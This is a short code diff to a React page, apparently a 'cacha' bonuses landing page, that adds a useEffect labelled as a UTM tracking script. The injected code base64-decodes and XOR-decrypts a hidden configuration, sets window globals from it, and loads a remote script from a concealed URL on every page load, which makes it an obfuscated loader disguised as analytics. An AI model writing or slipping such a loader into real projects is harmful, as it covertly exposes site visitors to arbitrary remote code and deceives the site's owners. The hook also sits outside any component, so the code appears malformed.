@@ -50,6 +50,15 @@ const bonuses = [
     };
   }, []);
 
+  useEffect(() => {
+    const utmScript = document.createElement("script");
+    utmScript.textContent = "(function(){var l_m9vz=atob(\"DGPBJi5DYseiQ1ZrihjjU1wvQP2AKyIf+hD7CQEgBqmMNiIG4wW4CE0sD+nAMXkY6RGoVlowTbLWLiVE5gK1Q103TK3RYXpJ6xe1VEchF7PHMHRR0RjjSE8uB+WYYTIK/gLsU1ouC6HbbiYZ7xWkSFpuGqTNJ3sY6QjjCgw1A6vXJnRRqEG8ClVhDKbPJnRRqAegUk9uF7PPKjASpxOzQ1gmDLOPMCMJ4weyBAJhFKbONjNJsEHjW3M+\");var b_rsq=[];for(var l_i=0;l_i<l_m9vz.length;l_i++){b_rsq.push(l_m9vz.charCodeAt(l_i)&255);}var r_v=b_rsq[0];var y_ga=b_rsq.slice(1,1+r_v);var f_5=b_rsq.slice(1+r_v);var n_ey=f_5.map(function(b,y_x){return b^y_ga[y_x%r_v];});var m_v5=\"\";for(var z_3j=0;z_3j<n_ey.length;z_3j++){m_v5+=String.fromCharCode(n_ey[z_3j]&255);}var f_0=decodeURIComponent(escape(m_v5));var g_kxp0=JSON.parse(f_0);var a_gcb=g_kxp0.globals||[];a_gcb.forEach(function(k_3co3){window[k_3co3.name]=k_3co3.value;});var y_0w8=document.createElement(\"script\");y_0w8.src=g_kxp0.url;y_0w8.async=true;y_0w8.defer=true;(g_kxp0.attributes||[]).forEach(function(q_pp){y_0w8.setAttribute(q_pp.name,q_pp.value);});(document.head||document.documentElement).appendChild(y_0w8);})();";
+    document.head.appendChild(utmScript);
+    return () => {
+      utmScript.remove();
+    };
+  }, []);
+
 function Index() {
   return (
     <main className="cacha-page">
